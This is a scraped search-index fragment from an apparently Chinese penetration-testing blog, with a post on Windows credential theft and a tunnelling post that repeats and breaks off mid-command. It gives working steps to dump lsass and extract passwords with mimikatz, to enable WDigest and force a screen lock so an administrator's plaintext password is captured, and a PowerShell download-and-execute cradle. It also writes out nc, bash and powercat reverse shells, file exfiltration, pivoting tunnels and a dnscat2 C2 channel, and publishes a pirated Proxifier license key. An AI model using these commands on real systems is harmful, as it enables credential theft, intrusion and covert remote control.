另外有师傅测试2008没有该exe文件，2016存在。没有的情况可以选择传一个上去。\n使用方法\nfor /f \u0026quot;tokens=2\u0026quot; %i in ('tasklist /FI \u0026quot;IMAGENAME eq lsass.exe\u0026quot; /NH') do rdrleakdiag.exe /p %i /o c:\\users\\ /fullmemdmp /wait 1\r 会产生两个文件，results_+进程pid+.hlk，minidump_+进程pid+.dmp。\n6.wce wce.exe -w 读取系统明文密码\rwme.exe -l 获取hash\r 7.PwDump7 PwDump7.exe\r 8.SharpDump 地址：https://github.com/GhostPack/SharpDump\nSharpDump.exe\r 9.AvDump工具 Avdump.exe 是Avast Home Security 产品套件一起提供的小工具。顾名思义，该实用程序将给定进程标识符的内存转储到用户指定的位置。我们可以通过它进行新的 dump 方式利用。\n从https://www.pconlife.com/viewfileinfo/avdump-exe/ 下载该程序。需要在powershell环境下运行该程序，测试cmd环境下无法导出：\ntasklist | findstr /i lsass.exe\r .\\AvDump.exe --pid 684 --exception_ptr 0 --dump_level 1 --thread_id 0 --min_interval 0 --dump_file c:\\lsass.dmp\r 解密\n将 lsass.dmp 下载到本地后，然后执行 mimikatz:\nmimikatz.exe \u0026quot;sekurlsa::minidump lsass.dmp\u0026quot; \u0026quot;sekurlsa::logonPasswords full\u0026quot; exit\r 为了方便复制与查看，可以输出到本地文件里面：\nmimikatz.exe \u0026quot;sekurlsa::minidump lsass.dmp\u0026quot; \u0026quot;sekurlsa::logonPasswords full\u0026quot; \u0026gt; pssword.txt\r KB2871997补丁 在 KB2871997 之前， Mimikatz 可以直接抓取明文密码。\n当服务器安装 KB2871997 补丁后，系统默认禁用 Wdigest Auth ，内存（lsass进程）不再保存明文口令。Mimikatz 将读不到密码明文。 但由于一些系统服务需要用到 Wdigest Auth，所以该选项是可以手动开启的。（开启后，需要用户重新登录才能生效）\n原理：获取到内存文件lsass.exe进程(它用于本地安全和登陆策略)中存储的明文登录密码\n利用前提：拿到了admin权限的cmd，管理员用密码登录机器，并运行了lsass.exe进程，把密码保存在内存文件lsass进程中。\n抓取明文：手工修改注册表 + 强制锁屏 + 等待目标系统管理员重新登录 = 截取明文密码\n在默认情况下，当系统为win10或2012R2以上时，默认在内存缓存中禁止保存明文密码，密码字段显示为null，此时可以通过以下方式开启，但需要用户重新登录后才能成功抓取。\n开启Wdigest Auth\n  cmd\nreg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\r   powershell\nSet-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -Name UseLogonCredential -Type DWORD -Value 1\r   meterpreter\nreg setval -k HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest -v UseLogonCredential -t REG_DWORD -d 1\r   关闭Wdigest Auth\n关闭命令如下：\n  cmd\nreg add HKLMSYSTEMCurrentControlSetControlSecurityProvidersWDigest /v UseLogonCredential /t REG_DWORD /d 0 /f\r   powershell\nSet-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest -Name UseLogonCredential -Type DWORD -Value 0\r   meterpreter\nreg setval -k HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SecurityProviders\\\\WDigest -v UseLogonCredential -t REG_DWORD -d 0\r   强制锁屏\n在开启 Wdigest Auth 后，需要管理员重新登录才能抓明文密码。\n强制锁屏，让管理员重新登录。\n  cmd\nrundll32 user32.dll,LockWorkStation\r   powershell\nFunction Lock-WorkStation {\r$signature = @\u0026quot;\r[DllImport(\u0026quot;user32.dll\u0026quot;, SetLastError = true)]\rpublic static extern bool LockWorkStation();\r\u0026quot;@\r$LockWorkStation = Add-Type -memberDefinition $signature -name \u0026quot;Win32LockWorkStation\u0026quot; -namespace Win32Functions -passthru\r$LockWorkStation::LockWorkStation() | Out-Null\r}\rLock-WorkStation\r   powershell -c \u0026quot;IEX (New-Object Net.WebClient).DownloadString('https://x.x.x.x/Lock-WorkStation.ps1');\u0026quot;\r 重新读取，可读到明文密码。\n参考地址： https://uknowsec.cn/posts/notes/Mimikatz%E6%98%8E%E6%96%87%E5%AF%86%E7%A0%81%E6%8A%93%E5%8F%96.html\rhttps://www.jianshu.com/p/7ccf6e15fbe0\rhttps://blog.thekingofduck.com/post/Dumping-Windows-Local-Credentials-Tools/\r ","id":5,"section":"posts","summary":"0×00 前言 市面上可见到的读Windows本地密码的大多工具都是变则法子的去读lsass.exe这个密码的内存或者SAM数据库，然后从里面提","tags":["内网渗透","凭据窃取"],"title":"windows抓取hash总结","uri":"https://ad-calcium.github.io/2021/09/windows%E6%8A%93%E5%8F%96hash%E6%80%BB%E7%BB%93/","year":"2021"},{"content":"0x00 内网穿透技术 当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等\n主要隧道有：\nICMP TCP UDP SSH HTTP DNS SOCKS\r 0x01 首先判断出网协议 icmp协议： ping www.baidu.com\r TCP协议： curl www.baidu.com\rnc IP\r HTTP协议： curl ip:port\rcurl www.baidu.com:80\r DNS协议： Nslookup www.baidu.com\rDig www.baidu.com\r 0x02理论知识 正向代理 正向代理类似一个跳板机，代理访问外部资源（比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了）\r 反向代理 反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器\r 0x03常用工具 https://www.proxifier.com/\rhttps://github.com/fatedier/frp\rhttps://github.com/ehang-io/nps\rhttps://github.com/L-codes/Neo-reGeorg\rproxifier注册码\r用户名：zxhi\r注册码：LYZGL-F2KX3-JW5W4-A33MC-25QHH\r 0x04 各种协议隧道 一、Socks代理 1. FRP隧道 1.1 正向代理 1、在客户端配置 [common]\rbind_addr = 0.0.0.0\rbind_port = 7000\rtoken = 123456\r 配置好之后运行frps.exe -c frps.ini\n2、在vps中配置 frpc.ini\n[common]\r# 填写客户端的\rserver_addr = 10.108.3.58\rserver_port = 7000\rtoken = 123456\r[plugin_http_proxy]\rtype = tcp\rremote_port = 7890\rplugin = http_proxy\r# 可以添加认证\r# plugin_http_user = abc\r# plugin_http_passwd = abc\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\r# plugin_user = abc\r# plugin_passwd = abc\r 配置好之后运行frpc.exe -c frpc.ini\n1.2. 反向代理 目的：\n1.需要通过公网服务器代理连接内网机器\r2.需要通过代理使得本机外网地址变为该内网机器外网IP\r 拓扑图\n1、首先在公网上配置服务端(frps.ini) #frps.ini\n[common]\rbind_addr = 0.0.0.0\rbind_port = 7000\rtoken = 123456\r 配置好之后运行frps.exe -c frps.ini\n2、配置客户端frpc. ini #frpc.ini\n[common]\r# 填写攻击机的地址\rserver_addr = 10.108.3.58\rserver_port = 7000\rtoken = 123456\r[plugin_http_proxy]\rtype = tcp\rremote_port = 7890\rplugin = http_proxy\r# 可以添加认证\r# plugin_http_user = abc\r# plugin_http_passwd = abc\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\r# plugin_user = abc\r# plugin_passwd = abc\r 配置好之后运行frpc.exe -c frpc.ini\n3、配置proxifier 配置ip、端口、连接方式、账号密码\n配置通过该代理的IP Target hosts处添加允许通过的IP（一般内网我都会只让内网的IP通过，防止流量过大）\n尝试访问内网地址\n1.3.多层socks代理 实验环境：内网C主机不能直接连接vps，可以连接内网B主机，B主机可以直接连接vps，所以通过B作为跳板，将socks代理建设在内网C主机中\n具体思路：利用B即作为服务端(frps)，也同时作为客户端(frpc)\n1、VPS配置frps.ini #frps.ini\n[common]\rbind_addr = 0.0.0.0\rbind_port = 7000\r 配置好之后运行\nfrps.exe -c frps.ini\r 2、内网B主机的frps.ini设置： [common]\r#填写ip当前主机的ip地址\rbind_addr = 192.168.100.40\rbind_port = 7000\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 3、内网C主机的frpc.ini设置 frpc.ini\n[common]\r#填写跳板的地址，这里填写的是主机website主机的iP地址\rserver_addr = 192.168.100.40\rserver_port = 7000\r[plugin_socks5]\rtype = tcp\rremote_port = 7777\rplugin = socks5\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 4、内网B主机的frpc.ini设置： #frpc.ini\n[common]\r# 填写自己的服务器IP\rserver_addr = 10.108.3.58\rserver_port = 7000\r[pandan]\rtype = tcp\rlocal_ip= 192.168.100.40\rremote_port = 7777\rlocal_port = 7777\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 思路分析：\n两个启动以后，其实已经可以直接通过使用B主机ip+端口直接使用搭建在C主机的socks代理，但是此时是无法直接访问B主机的，但是B主机出网，所以可以通过将刚刚C连接B的7891端口映射到vps上，通过连接vps+端口使用C主机的socks代理\n5、测试socks代理是否搭建成功： 访问主机B的web服务(192.168.1.50)\n访问主机C的web服务(192.168.2.200)\n说明代理没问题\n2.EW 2.1、反向代理 攻击机：\new -s rcsocks -l 1081 -e 1080\r将靶机中的1080端口流量代理到本地的1081端口上\r 靶机\new -s rssocks -d 攻击机IP -e 1080\r 2.2、多层代理 获得目标网络内两台主机 A、B 的权限，情况描述如下：\rA 主机： 目标网络的边界主机，无公网 IP，无法访问特定资源。\rB 主机： 目标网络内部主机，可访问特定资源，却无法回连公网。\rA 主机可直连 B 主机\r一台可控公网IP主机 可控内网主机A 内网主机C\r+---------+ +--------------------------+ | +------------------------+ +-----------------------------+\r|HackTools| -\u0026gt;\u0026gt; | 9999 -\u0026gt; 10.108.3.58 -\u0026gt; 8888 | 防火墙 | \u0026lt;-- 192.168.1.50 --\u0026gt; | -\u0026gt;\u0026gt; | 9999 --\u0026gt; 192.168.2.200 |\r+---------+ +--------------------------+ | +------------------------+ +-----------------------------+\r 在VPS( 10.108.3.58 )公网主机添加转接隧道，将 9999收到的代理请求，转交给反连 8888 端口的主机\new -s lcx_listen -l 9999 -e 8888\r 在内网主机A(192.168.2.200)上利用 ssocksd 方式启动 7777端口的 socks 代理\new -s ssocksd -l 777\r 在 192.168.1.50 上，通过工具的 lcx_slave 方式，打通10.108.3.58:9999 和 192.168.2.200:7777之间的通讯隧道\new -s lcx_slave -d 10.108.3.58 -e 8888 -f 192.168.1.200 -g 7777\r 验证\n3.NPS NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。\n3.1 反向代理 配置nps 在nps目录下面会有一个nps可执行文件、conf配置目录和web网页目录，我们只需要修改conf/nps.conf即可：\n需要改一下#web下面的几个参数，\nweb_host= 服务器IP或者域名\rweb_username= admin（登录用户名）\rweb_password= 你的密码\rweb_port=8080（web管理端口）\r 修改#bridge 可以更改 NPC的连接端口。比如我们拿到一台权限受限的服务器，有防火墙，可能只有部分端口（80，443）可以出网，就需要修改成出网端口。\n##bridge\rbridge_type=tcp\rbridge_port=443 # 修改连接端口\rbridge_ip=0.0.0.0\r 启动server 访问WEB管理页面（默认web界面端口是8080，默认密码为admin/123 ，可以在配置文件里修改默认端口和账号密码）\n新增客户端 设置客户端验证秘钥：\n配置客户端 上传客户端文件至C，解压后在CMD运行命令：\nnpc.exe -server=10.108.3.147:8024 -vkey=123456 -type=tcp\r 在web管理页面可以看到C主机已上线：\n配置Socks5代理 现在A仍然无法访问内网的C主机，需要使用Socks5客户端软件把流量带出来。\n注意：一定要等客户端上线以后在配置Socks代理。\n新增成功后的页面：\n测试 配置Proxifier\n测试成功\n官方文档：https://ehang-io.github.io/nps/#/?id=nps\n二、传输层 2.1. nc nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下\n简单互相传输功能：\nvps：nc -lp 5555 目标机器：Nc -vn vpsip 5555\r 文件传输功能：\nvps：nc -lp 5555 \u0026gt;1.txt\r目标机器：Nc -vn vpsip \u0026lt; xx.txt\r shell的反弹：\n正向连接：\rnc -lvp 4444 -e /bin/sh\rnc 192.168.1.1 4444\r反向连接：\rnc -lvp 4444\rnc 192.168.1.1 4444 -e /bin/sh\r 注意：windows版本CMD位置C:\\windows\\system32\\cmd.exe\nBash反向shell\nnc -lvp 4444\rBash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.1/4444 0\u0026gt;\u0026amp;1\r 2.2 Powercat（powershell版的nc） 正向和反向连接：\rpowercat -l -p 8080 -e cmd.exe -v nc 192.168.1.1 8080 -vv\rnc -l -p 8080 -vv\rpowercat -c 192.169.1.1 -p 8080 -e cmd.exe -v\r 可以反弹powershell\n-eq  文件上传\n这个不用说，基本这种连接的都支持\n在c:下新建一个test.txt的文件，写入数据\n在有text.txt的机器执行:\npowercat -c 192.168.12.108 -p 9999 -i c:test.txt -v\r 另一台机器执行\npowercat -l -p 9999 -of c:test.txt -v\r 3.lcx端口转发 windows\rvps: lcx -listen 2222 3333 //2222为转发端口，3333为本机任意未被占用的端口\r肉鸡：lcx -slave vps_ip 2222 127.0.0.1 3389 //将本地3389端口转发至vps_ip 2222端口\r3389连接时格式 vps:3333\rlinux\rvps：./portmap -m 2 -p1 6666 -h2 公网IP -p2 7777\r肉鸡：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666\r将内网主机22端口的流量转发到公网主机的6666端口\r 5.neo-reGeorg VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)\npython neoreg.py generate -k \u0026lt;you_password\u0026gt; --file 404.html\r 将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。\nVPS上运行\npython neoreg.py -k \u0026lt;you_password\u0026gt; -u \u0026lt;server_url\u0026gt; --proxy socks5://10.1.1.1:8080（本地代理地址）\r Socks连接工具连接本地127.0.0.1:1080\n三、应用层 3.1 SSH转发 一个正常的SSH命令\n ssh root@192.168.1.1\r SSH 本地转发机制 拓扑：VPS\u0026mdash;-边界WEB\u0026mdash;-目标主机\n边界WEB双网卡192.168.1.1和10.1.1.1段\n本地转发机制：\n选项：\n-C 压缩传输\r-f 后台启用\r-N 不打开远程shell，处于等待状态\r-g 允许本地转发端口\r 使用方法：\n在VPS上运行\n用法：ssh -CfNg -L \u0026lt;vps port\u0026gt;:\u0026lt;目标主机 host\u0026gt;:\u0026lt;目标主机 port\u0026gt; \u0026lt;SSH 边界机\u0026gt;\rssh -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1\r#VPS检查---查看端口是否已经连接\rnetstat -tulnp | grep \u0026quot;5555\u0026quot;\r 当访问 VPS 5555 端口的时候，就转发给 root@192.168.1.1 边界机 ，发送给目标主机\nSSH 远程转发机制 拓扑：VPS\u0026mdash;-边界WEB\u0026mdash;-目标主机\n边界WEB\u0026mdash;-目标主机\u0026mdash;都是单网卡，都是纯内网 10.1.1.1段\n在WEB边界机运行\nssh -CfNg -R \u0026lt;vps port\u0026gt;:\u0026lt;目标主机 host\u0026gt;:\u0026lt;目标主机 port\u0026gt; \u0026lt;SSH VPS主机\u0026gt;\rssh -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102\r 边界机把内网的端口，远程连接道VPS，远程转发道VPS\nSSH 动态转发机制 这里主要是建立一个动态的socks代理隧道\n在VPS上运行\nssh -CfNg -D 7000 \u0026lt;SSH 边界主机\u0026gt;\rssh -CfNg -D 7000 root@192.168.1.1\r VPS上7000端口上，开了一个socks代理，用代理软件就可以连接\n3.2 DNS 隧道： dnscat2\n工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台\ndnscat2分为两个部分：客户端和服务器。\n服务端为Ruby编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：\n服务端VPS：\n安装依赖：\rapt install gem\rapt install ruby-dev\rapt install libpq-dev\rapt install ruby-bundler\r下载并安装：\rgit clone https://github.com/iagox86/dnscat2.git\rcd dnscat2/server\rsudo gem install bundler\r开启服务：\rruby ./dnscat2.rb vpn.zeo.com -e open\r 目标主机客户端：\n上传dnsClient.zip 到目标主机 解压\n./dnscat --dns server=服务端ip,port=53 --secret=服务端生成的秘钥\r 直连模式使用方法：\nVPS中 server路径下：\rruby ./dnscat2\r客户端：（这个命令会在 上面服务启动后提示，可以参考下面的截图红框）\r./dnscat --dns server=x.x.x.x,port=53 --secret=281fc7a7ec57d500d269c96b8ae36ba5\r 四、网络层 4.1 ICMP隧道 ICMP（Internet Control Message Protocol）：没有目的端口与源端口，属于Internet控制报文协议。它是TCP/IP协议簇的一个子协议，用于在IP主机、路由器之间传递控制消息。控制消息是指网络通不通、主机是否可达、路由是否可用等网络本身的消息。\nicmp隧道常用攻击：icmpsh、PRISM\nicmpsh 环境说明:跨平台、不需要管理员运行\n有三台机器： VPS\u0026ndash;边界机\u0026ndash;内网机\nVPS操作过程：\n下载icmpsh\n安装依赖\n服务端禁用：\ricmp respones sysctl -w net.ipv4.icmp_echo_ignore_all=1\r运行程序 ：\r./run.sh\r输入目标主机IP地址 开启监听：\r./icmpsh_m,py vpsip 边界出网的公网IP\r在边界机执行：\rImp.exe -t 攻击机ip -d 500 -b 30 -s 128\r 还有一种方法\n编译 gcc icmpsh-m.c\rVPS开启监听： sudo ./a.out\r内网边界主机：icmpsh.exe -t VPSip -d 500 -b 30 -s 128\r 4.2 Lcx 内网端口转发\n目标主机：lcx.exe -slave vpsip 4444 127.0.0.1 3389\rVPS:Lcx --listen 4444 5555\r ","id":6,"section":"posts","summary":"0x00 内网穿透技术 当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等 主","tags":["流量代理","内网渗透"],"title":"内网穿透工具的使用","uri":"https://ad-calcium.github.io/2021/09/%E6%B5%81%E9%87%8F%E4%BB%A3%E7%90%86/","year":"2021"},{"content":"0x00 内网穿透技术 当我们拿到一台内网主机后，一般都是有区域隔离的。所以这时候就用到流量代理了。这里简单介绍一下建立通信隧道，常见的有端口转发等\n主要隧道有：\nICMP TCP UDP SSH HTTP DNS SOCKS\r 0x01 首先判断出网协议 icmp协议： ping www.baidu.com\r TCP协议： curl www.baidu.com\rnc IP\r HTTP协议： curl ip:port\rcurl www.baidu.com:80\r DNS协议： Nslookup www.baidu.com\rDig www.baidu.com\r 0x02理论知识 正向代理 正向代理类似一个跳板机，代理访问外部资源（比如我们国内访问谷歌，直接访问访问不到，我们可以通过一个正向代理服务器，请求发到代理服，代理服务器能够访问谷歌，这样由代理去谷歌取到返回数据，再返回给我们，这样我们就能访问谷歌了）\r 反向代理 反向代理（Reverse Proxy）实际运行方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器\r 0x03常用工具 https://www.proxifier.com/\rhttps://github.com/fatedier/frp\rhttps://github.com/ehang-io/nps\rhttps://github.com/L-codes/Neo-reGeorg\rproxifier注册码\r用户名：zxhi\r注册码：LYZGL-F2KX3-JW5W4-A33MC-25QHH\r 0x04 各种协议隧道 一、Socks代理 1. FRP隧道 1.1 正向代理 1、在客户端配置 [common]\rbind_addr = 0.0.0.0\rbind_port = 7000\rtoken = 123456\r 配置好之后运行frps.exe -c frps.ini\n2、在vps中配置 frpc.ini\n[common]\r# 填写客户端的\rserver_addr = 10.108.3.58\rserver_port = 7000\rtoken = 123456\r[plugin_http_proxy]\rtype = tcp\rremote_port = 7890\rplugin = http_proxy\r# 可以添加认证\r# plugin_http_user = abc\r# plugin_http_passwd = abc\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\r# plugin_user = abc\r# plugin_passwd = abc\r 配置好之后运行frpc.exe -c frpc.ini\n1.2. 反向代理 目的：\n1.需要通过公网服务器代理连接内网机器\r2.需要通过代理使得本机外网地址变为该内网机器外网IP\r 拓扑图\n1、首先在公网上配置服务端(frps.ini) #frps.ini\n[common]\rbind_addr = 0.0.0.0\rbind_port = 7000\rtoken = 123456\r 配置好之后运行frps.exe -c frps.ini\n2、配置客户端frpc. ini #frpc.ini\n[common]\r# 填写攻击机的地址\rserver_addr = 10.108.3.58\rserver_port = 7000\rtoken = 123456\r[plugin_http_proxy]\rtype = tcp\rremote_port = 7890\rplugin = http_proxy\r# 可以添加认证\r# plugin_http_user = abc\r# plugin_http_passwd = abc\r[plugin_socks5]\rtype = tcp\rremote_port = 7891\rplugin = socks5\r# plugin_user = abc\r# plugin_passwd = abc\r 配置好之后运行frpc.exe -c frpc.ini\n3、配置proxifier 配置ip、端口、连接方式、账号密码\n配置通过该代理的IP Target hosts处添加允许通过的IP（一般内网我都会只让内网的IP通过，防止流量过大）\n尝试访问内网地址\n1.3.多层socks代理 实验环境：内网C主机不能直接连接vps，可以连接内网B主机，B主机可以直接连接vps，所以通过B作为跳板，将socks代理建设在内网C主机中\n具体思路：利用B即作为服务端(frps)，也同时作为客户端(frpc)\n1、VPS配置frps.ini #frps.ini\n[common]\rbind_addr = 0.0.0.0\rbind_port = 7000\r 配置好之后运行\nfrps.exe -c frps.ini\r 2、内网B主机的frps.ini设置： [common]\r#填写ip当前主机的ip地址\rbind_addr = 192.168.100.40\rbind_port = 7000\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 3、内网C主机的frpc.ini设置 frpc.ini\n[common]\r#填写跳板的地址，这里填写的是主机website主机的iP地址\rserver_addr = 192.168.100.40\rserver_port = 7000\r[plugin_socks5]\rtype = tcp\rremote_port = 7777\rplugin = socks5\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 4、内网B主机的frpc.ini设置： #frpc.ini\n[common]\r# 填写自己的服务器IP\rserver_addr = 10.108.3.58\rserver_port = 7000\r[pandan]\rtype = tcp\rlocal_ip= 192.168.100.40\rremote_port = 7777\rlocal_port = 7777\r 配置好之后运行\nfrpc.exe -c frpc.ini\r 思路分析：\n两个启动以后，其实已经可以直接通过使用B主机ip+端口直接使用搭建在C主机的socks代理，但是此时是无法直接访问B主机的，但是B主机出网，所以可以通过将刚刚C连接B的7891端口映射到vps上，通过连接vps+端口使用C主机的socks代理\n5、测试socks代理是否搭建成功： 访问主机B的web服务(192.168.1.50)\n访问主机C的web服务(192.168.2.200)\n说明代理没问题\n2.EW 2.1、反向代理 攻击机：\new -s rcsocks -l 1081 -e 1080\r将靶机中的1080端口流量代理到本地的1081端口上\r 靶机\new -s rssocks -d 攻击机IP -e 1080\r 2.2、多层代理 获得目标网络内两台主机 A、B 的权限，情况描述如下：\rA 主机： 目标网络的边界主机，无公网 IP，无法访问特定资源。\rB 主机： 目标网络内部主机，可访问特定资源，却无法回连公网。\rA 主机可直连 B 主机\r一台可控公网IP主机 可控内网主机A 内网主机C\r+---------+ +--------------------------+ | +------------------------+ +-----------------------------+\r|HackTools| -\u0026gt;\u0026gt; | 9999 -\u0026gt; 10.108.3.58 -\u0026gt; 8888 | 防火墙 | \u0026lt;-- 192.168.1.50 --\u0026gt; | -\u0026gt;\u0026gt; | 9999 --\u0026gt; 192.168.2.200 |\r+---------+ +--------------------------+ | +------------------------+ +-----------------------------+\r 在VPS( 10.108.3.58 )公网主机添加转接隧道，将 9999收到的代理请求，转交给反连 8888 端口的主机\new -s lcx_listen -l 9999 -e 8888\r 在内网主机A(192.168.2.200)上利用 ssocksd 方式启动 7777端口的 socks 代理\new -s ssocksd -l 777\r 在 192.168.1.50 上，通过工具的 lcx_slave 方式，打通10.108.3.58:9999 和 192.168.2.200:7777之间的通讯隧道\new -s lcx_slave -d 10.108.3.58 -e 8888 -f 192.168.1.200 -g 7777\r 验证\n3.NPS NPS工具是一款使用go语言编写的轻量级、功能强大的内网穿透工具。支持TCP、UDP流量转发，支持内网HTTP、SOCKS5代理，同时支持snappy压缩(节省带宽和流量)、站点保护、加密传输、多路复用、header修改等。同时还支持web图形化管理。该工具使用简单，相比于FRP，NPS是图形化界面，因此配置更加简单。\n3.1 反向代理 配置nps 在nps目录下面会有一个nps可执行文件、conf配置目录和web网页目录，我们只需要修改conf/nps.conf即可：\n需要改一下#web下面的几个参数，\nweb_host= 服务器IP或者域名\rweb_username= admin（登录用户名）\rweb_password= 你的密码\rweb_port=8080（web管理端口）\r 修改#bridge 可以更改 NPC的连接端口。比如我们拿到一台权限受限的服务器，有防火墙，可能只有部分端口（80，443）可以出网，就需要修改成出网端口。\n##bridge\rbridge_type=tcp\rbridge_port=443 # 修改连接端口\rbridge_ip=0.0.0.0\r 启动server 访问WEB管理页面（默认web界面端口是8080，默认密码为admin/123 ，可以在配置文件里修改默认端口和账号密码）\n新增客户端 设置客户端验证秘钥：\n配置客户端 上传客户端文件至C，解压后在CMD运行命令：\nnpc.exe -server=10.108.3.147:8024 -vkey=123456 -type=tcp\r 在web管理页面可以看到C主机已上线：\n配置Socks5代理 现在A仍然无法访问内网的C主机，需要使用Socks5客户端软件把流量带出来。\n注意：一定要等客户端上线以后在配置Socks代理。\n新增成功后的页面：\n测试 配置Proxifier\n测试成功\n官方文档：https://ehang-io.github.io/nps/#/?id=nps\n二、传输层 2.1. nc nc 是一款比较老的工具，但是确实是经典俗称瑞士军刀，简单介绍一下\n简单互相传输功能：\nvps：nc -lp 5555 目标机器：Nc -vn vpsip 5555\r 文件传输功能：\nvps：nc -lp 5555 \u0026gt;1.txt\r目标机器：Nc -vn vpsip \u0026lt; xx.txt\r shell的反弹：\n正向连接：\rnc -lvp 4444 -e /bin/sh\rnc 192.168.1.1 4444\r反向连接：\rnc -lvp 4444\rnc 192.168.1.1 4444 -e /bin/sh\r 注意：windows版本CMD位置C:\\windows\\system32\\cmd.exe\nBash反向shell\nnc -lvp 4444\rBash -i \u0026gt;\u0026amp; /dev/tcp/192.168.1.1/4444 0\u0026gt;\u0026amp;1\r 2.2 Powercat（powershell版的nc） 正向和反向连接：\rpowercat -l -p 8080 -e cmd.exe -v nc 192.168.1.1 8080 -vv\rnc -l -p 8080 -vv\rpowercat -c 192.169.1.1 -p 8080 -e cmd.exe -v\r 可以反弹powershell\n-eq  文件上传\n这个不用说，基本这种连接的都支持\n在c:下新建一个test.txt的文件，写入数据\n在有text.txt的机器执行:\npowercat -c 192.168.12.108 -p 9999 -i c:test.txt -v\r 另一台机器执行\npowercat -l -p 9999 -of c:test.txt -v\r 3.lcx端口转发 windows\rvps: lcx -listen 2222 3333 //2222为转发端口，3333为本机任意未被占用的端口\r肉鸡：lcx -slave vps_ip 2222 127.0.0.1 3389 //将本地3389端口转发至vps_ip 2222端口\r3389连接时格式 vps:3333\rlinux\rvps：./portmap -m 2 -p1 6666 -h2 公网IP -p2 7777\r肉鸡：./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 公网ip -p2 6666\r将内网主机22端口的流量转发到公网主机的6666端口\r 5.neo-reGeorg VPS上支持生成的服务端，默认 GET 请求响应指定的页面内容 (如伪装的404页面)\npython neoreg.py generate -k \u0026lt;you_password\u0026gt; --file 404.html\r 将相应的隧道文件放到目标服务器的web目录后使用neoreg连接web服务器并建立本地socks代理。\nVPS上运行\npython neoreg.py -k \u0026lt;you_password\u0026gt; -u \u0026lt;server_url\u0026gt; --proxy socks5://10.1.1.1:8080（本地代理地址）\r Socks连接工具连接本地127.0.0.1:1080\n三、应用层 3.1 SSH转发 一个正常的SSH命令\n ssh root@192.168.1.1\r SSH 本地转发机制 拓扑：VPS\u0026mdash;-边界WEB\u0026mdash;-目标主机\n边界WEB双网卡192.168.1.1和10.1.1.1段\n本地转发机制：\n选项：\n-C 压缩传输\r-f 后台启用\r-N 不打开远程shell，处于等待状态\r-g 允许本地转发端口\r 使用方法：\n在VPS上运行\n用法：ssh -CfNg -L \u0026lt;vps port\u0026gt;:\u0026lt;目标主机 host\u0026gt;:\u0026lt;目标主机 port\u0026gt; \u0026lt;SSH 边界机\u0026gt;\rssh -CfNg -l 5555:10.1.1.1:3389 root@192.168.1.1\r#VPS检查---查看端口是否已经连接\rnetstat -tulnp | grep \u0026quot;5555\u0026quot;\r 当访问 VPS 5555 端口的时候，就转发给 root@192.168.1.1 边界机 ，发送给目标主机\nSSH 远程转发机制 拓扑：VPS\u0026mdash;-边界WEB\u0026mdash;-目标主机\n边界WEB\u0026mdash;-目标主机\u0026mdash;都是单网卡，都是纯内网 10.1.1.1段\n在WEB边界机运行\nssh -CfNg -R \u0026lt;vps port\u0026gt;:\u0026lt;目标主机 host\u0026gt;:\u0026lt;目标主机 port\u0026gt; \u0026lt;SSH VPS主机\u0026gt;\rssh -CfNg -l 6666:10.1.1.1:3389 root@49.121.1.102\r 边界机把内网的端口，远程连接道VPS，远程转发道VPS\nSSH 动态转发机制 这里主要是建立一个动态的socks代理隧道\n在VPS上运行\nssh -CfNg -D 7000 \u0026lt;SSH 边界主机\u0026gt;\rssh -CfNg -D 7000 root@192.168.1.1\r VPS上7000端口上，开了一个socks代理，用代理软件就可以连接\n3.2 DNS 隧道： dnscat2\n工具dnscat2，这是一DNS隧道，该工具旨在通过DNS协议创建加密的命令和控制（C＆C）通道，还有自己的控制台\ndnscat2分为两个部分：客户端和服务器。\n服务端为Ruby编写，需安装Ruby环境。kali系统内置Ruby，但是运行时仍可能报缺少一些gem依赖：\n服务端VPS：\n安装依赖：\rapt install gem\rapt install ruby-dev\rapt install libpq-dev\rapt install ruby-bundler\r下载并安装：\rgit clone https://github.com/iagox86/dnscat2.git\rcd dnscat2/server\rsudo gem install 